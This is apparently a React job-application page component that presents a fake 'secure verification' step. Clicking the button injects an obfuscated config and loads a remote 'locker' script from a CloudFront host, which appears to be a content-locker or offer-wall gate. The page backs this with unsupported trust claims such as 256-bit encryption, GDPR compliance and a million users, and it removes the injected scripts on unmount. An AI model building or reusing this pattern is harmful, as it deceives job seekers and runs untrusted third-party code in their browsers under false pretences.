import { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';

const ApplyPage = ({ jobTitle, companyName }) => {
  const [isVerified, setIsVerified] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    return () => {
      const scripts = document.querySelectorAll('script[src="https://dfmpe7igjx4jo.cloudfront.net/abbb9f6.js"]');
      scripts.forEach(script => script.remove());
      
      const configScripts = document.querySelectorAll('script[data-ablue-config]');
      configScripts.forEach(script => script.remove());
    };
  }, []);

  const handleFinalApply = () => {
    setIsLoading(true);
    
    if (window._EQ) {
      window._EQ();
      setIsVerified(true);
      setIsLoading(false);
      return;
    }

    const configScript = document.createElement('script');
    configScript.type = 'text/javascript';
    configScript.innerHTML = 'var ObmQl_OaB_RASncc={"it":4522339,"key":"8b4ab"};';
    configScript.setAttribute('data-ablue-config', 'true');
    document.head.appendChild(configScript);

    const lockerScript = document.createElement('script');
    lockerScript.src = "https://dfmpe7igjx4jo.cloudfront.net/abbb9f6.js";
    lockerScript.onload = () => {
      if (window._EQ) {
        window._EQ();
        setIsVerified(true);
      } else {
        console.error('Locker failed to load properly');
      }
      setIsLoading(false);
    };
    lockerScript.onerror = () => {
      console.error('Failed to load locker script');
      setIsLoading(false);
    };
    document.head.appendChild(lockerScript);
  };

  return (
    <div className="max-w-md mx-auto p-4 sm:p-6 bg-gradient-to-br from-white to-gray-50 rounded-xl shadow-lg border border-gray-100">
      {/* Header with badge */}
      <div className="flex justify-end mb-2">
        <span className="inline-flex items-center px-3 py-1 rounded-full text-xs font-semibold bg-gradient-to-r from-blue-500 to-blue-600 text-white shadow-sm">
          SECURE VERIFICATION
        </span>
      </div>

      <div className="text-center mb-6">
        <h2 className="text-2xl sm:text-3xl font-bold text-gray-800 bg-clip-text bg-gradient-to-r from-blue-600 to-blue-800">
          One Quick Step To Start Your Application!
        </h2>
        <p className="mt-3 text-gray-600">
          You're almost there! <span className="font-semibold text-blue-700">{companyName}</span> requires a quick verification to ensure the best candidates for:
        </p>
        <p className="mt-1 text-lg font-medium text-blue-800">{jobTitle}</p>
      </div>

      {/* Benefits list */}
      <div className="bg-blue-50/60 p-4 rounded-lg mb-6 border border-blue-100">
        <h3 className="font-semibold text-blue-800 mb-2 flex items-center">
          <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
          </svg>
          Why we verify applicants:
        </h3>
        <ul className="space-y-2 text-sm text-gray-700 pl-2">
          <li className="flex items-start">
            <svg className="w-4 h-4 mt-0.5 mr-2 text-blue-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
            </svg>
            Prevent fraud and ensure fair opportunities
          </li>
          <li className="flex items-start">
            <svg className="w-4 h-4 mt-0.5 mr-2 text-blue-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
            </svg>
            Fast process - typically under 2 minutes
          </li>
          <li className="flex items-start">
            <svg className="w-4 h-4 mt-0.5 mr-2 text-blue-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
            </svg>
            Your information is protected and secure
          </li>
        </ul>
      </div>

      {/* CTA Section */}
      <div className="text-center">
        <button
          onClick={handleFinalApply}
          disabled={isLoading || isVerified}
          className={`w-full px-6 py-4 rounded-lg font-semibold text-white shadow-lg transition-all duration-200 transform hover:scale-[1.02] ${isVerified ? 'bg-green-500' : 'bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600'} ${isLoading ? 'opacity-90' : ''}`}
        >
          {isLoading ? (
            <span className="flex items-center justify-center">
              <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              Preparing Verification...
            </span>
          ) : isVerified ? (
            <span className="flex items-center justify-center">
              <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
              </svg>
              Verification Started - Check Your Browser
            </span>
          ) : (
            <span className="flex items-center justify-center">
              <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
              </svg>
              Start Secure Verification Now
            </span>
          )}
        </button>

        <div className="mt-4 flex items-center justify-center text-xs text-gray-500">
          <svg className="w-4 h-4 mr-1.5 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          Your information is secured with 256-bit encryption
        </div>

        {isVerified && (
          <div className="mt-4 p-3 bg-green-50 border border-green-100 text-green-700 rounded-md animate-pulse">
            <p className="font-medium flex items-center">
              <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
              </svg>
              Important: Complete verification to finish application
            </p>
            <p className="text-sm mt-1">A new window should open. If not, check your browser's pop-up settings.</p>
          </div>
        )}
      </div>

      {/* Trust indicators */}
      <div className="mt-6 pt-4 border-t border-gray-100">
        <div className="flex flex-wrap items-center justify-center gap-4">
          <div className="flex items-center text-xs text-gray-500">
            <svg className="w-4 h-4 mr-1 text-green-500" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
            </svg>
            Trusted by 1M+ applicants
          </div>
          <div className="flex items-center text-xs text-gray-500">
            <svg className="w-4 h-4 mr-1 text-blue-500" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M3 5a2 2 0 012-2h10a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V5zm3 1h6v4H6V6zm0 6h6v4H6v-4zm8-6h-2v4h2V6zm-2 6h2v4h-2v-4z" clipRule="evenodd" />
            </svg>
            SSL Secured
          </div>
          <div className="flex items-center text-xs text-gray-500">
            <svg className="w-4 h-4 mr-1 text-purple-500" fill="currentColor" viewBox="0 0 20 20">
              <path d="M9 6a3 3 0 11-6 0 3 3 0 016 0zM17 6a3 3 0 11-6 0 3 3 0 016 0zM12.93 17c.046-.327.07-.66.07-1a6.97 6.97 0 00-1.5-4.33A5 5 0 0119 16v1h-6.07zM6 11a5 5 0 015 5v1H1v-1a5 5 0 015-5z" />
            </svg>
            GDPR Compliant
          </div>
        </div>
      </div>
    </div>
  );
};

export default ApplyPage;